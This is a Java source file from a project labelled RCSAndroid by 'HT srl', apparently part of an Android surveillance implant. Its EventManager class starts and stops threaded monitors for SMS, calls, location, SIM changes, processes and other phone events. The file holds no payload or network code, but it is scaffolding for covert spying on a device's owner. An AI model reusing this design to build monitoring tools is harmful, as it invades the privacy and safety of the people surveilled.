/***********************************************
 * Create by : Alberto "Quequero" Pelliccione
 * Company   : HT srl
 * Project   : RCSAndroid
 * Created   : 30-mar-2011
 **********************************************/

package com.ht.RCSAndroidGUI.event;

import java.util.HashMap;
import java.util.Iterator;
import java.util.Map;

import android.util.Log;

import com.ht.RCSAndroidGUI.Manager;
import com.ht.RCSAndroidGUI.agent.AgentBase;
import com.ht.RCSAndroidGUI.agent.AgentType;
import com.ht.RCSAndroidGUI.conf.Configuration;
import com.ht.RCSAndroidGUI.util.Check;

// TODO: Auto-generated Javadoc
/**
 * The Class EventManager.
 */
public class EventManager extends Manager<EventBase, Integer> {
	/** The Constant TAG. */
	private static final String TAG = "EventManager";

	/** The singleton. */
	private volatile static EventManager singleton;

	/**
	 * Self.
	 * 
	 * @return the event manager
	 */
	public static EventManager self() {
		if (singleton == null) {
			synchronized (EventManager.class) {
				if (singleton == null) {
					singleton = new EventManager();
				}
			}
		}

		return singleton;
	}

	/**
	 * mapAgent() Add agent id defined by "key" into the running map. If the
	 * agent is already present, the old object is returned.
	 * 
	 * @param key
	 *            : Agent ID
	 * @return the requested agent or null in case of error
	 */
	private EventBase factory(final EventType type, final int id) {
		EventBase e = null;

		if (running.containsKey(id) == true) {
			return (EventBase) running.get(type);
		}

		switch (type) {
			case EVENT_TIMER:
				Log.d("QZ", TAG + " Info: " + "");
				e = new EventTimer();
				break;

			case EVENT_SMS:
				Log.d("QZ", TAG + " Info: " + "EVENT_SMS");
				e = new EventSms();
				break;

			case EVENT_CALL:
				Log.d("QZ", TAG + " Info: " + "EVENT_CALL");
				e = new EventCall();
				break;

			case EVENT_CONNECTION:
				Log.d("QZ", TAG + " Info: " + "EVENT_CONNECTION");
				e = new EventConnectivity();
				break;

			case EVENT_PROCESS:
				Log.d("QZ", TAG + " Info: " + "EVENT_PROCESS");
				e = new EventProcess();
				break;

			case EVENT_CELLID:
				Log.d("QZ", TAG + " Info: " + "EVENT_CELLID");
				e = new EventCellId();
				break;

			case EVENT_QUOTA:
				Log.d("QZ", TAG + " Info: " + "EVENT_QUOTA");
				break;

			case EVENT_SIM_CHANGE:
				Log.d("QZ", TAG + " Info: " + "EVENT_SIM_CHANGE");
				e = new EventSim();
				break;

			case EVENT_LOCATION:
				Log.d("QZ", TAG + " Info: " + "EVENT_LOCATION");
				e = new EventLocation();
				break;

			case EVENT_AC:
				Log.d("QZ", TAG + " Info: " + "EVENT_AC");
				e = new EventAc();
				break;

			case EVENT_BATTERY:
				Log.d("QZ", TAG + " Info: " + "EVENT_BATTERY");
				e = new EventBattery();
				break;

			case EVENT_STANDBY:
				Log.d("QZ", TAG + " Info: " + "EVENT_STANDBY");
				e = new EventStandby();
				break;

			default:
				Log.d("QZ", TAG + " Error: " + "Unknown: " + type);
				break;
		}

		if (e != null) {
			running.put(id, e);
		}

		return e;
	}

	/**
	 * Start events.
	 * 
	 * @return true, if successful
	 */
	public boolean startAll() {
		HashMap<Integer, EventConf> events;

		events = status.getEventsMap();

		if (events == null) {
			Log.d("QZ", TAG + " Events map null");
			return false;
		}

		if (running == null) {
			Log.d("QZ", TAG + " Running Events map null");
			return false;
		}

		final Iterator<Map.Entry<Integer, EventConf>> it = events.entrySet().iterator();

		while (it.hasNext()) {
			final Map.Entry<Integer, EventConf> pairs = it.next();

			final EventConf conf = pairs.getValue();
			final EventType type = conf.getType();
			Check.asserts(pairs.getKey() == conf.getId(), "wrong mapping");

			final EventBase e = factory(type, conf.getId());

			if (e != null) {
				e.parse(conf);

				if (e.getStatus() != EventConf.EVENT_RUNNING) {
					final Thread t = new Thread(e);
					if (Configuration.DEBUG) {
						t.setName(e.getClass().getSimpleName());
					}
					t.start();
					Log.d("QZ", TAG + " (startAll): " + e);
					threads.put(e, t);
				} else {
					Log.d("QZ", TAG + " Warn: event already running");
				}
			}
		}

		return true;
	}

	// XXX Deve essere bloccante? Ovvero attendere l'effettivo stop di tutto?
	/**
	 * Stop events.
	 */
	public void stopAll() {
		final Iterator<Map.Entry<Integer, EventBase>> it = running.entrySet().iterator();

		while (it.hasNext()) {
			final Map.Entry<Integer, EventBase> pairs = it.next();
			final EventBase event = pairs.getValue();

			Log.d("QZ", TAG + " Stopping: " + event);

			if (event.getStatus() == EventConf.EVENT_RUNNING) {
				event.stopThread();

				try {
					final Thread t = (Thread) threads.get(event);
					Check.asserts(t != null, "Null thread");

					t.join();
					threads.remove(event);

				} catch (final InterruptedException e) {
					e.printStackTrace();
					Log.d("QZ", TAG + " Error: " + e.toString());
				}
			} else {
				Check.asserts(threads.get(event) == null, "Shouldn't find a thread");
			}

		}

		Check.ensures(threads.size() == 0, "Non empty threads");
		Check.ensures(running.size() == 0, "Non empty running");

		running.clear();
		threads.clear();
	}

	@Override
	public void start(Integer key) {
		// TODO Auto-generated method stub

	}

	@Override
	public void stop(Integer key) {
		// TODO Auto-generated method stub

	}
}
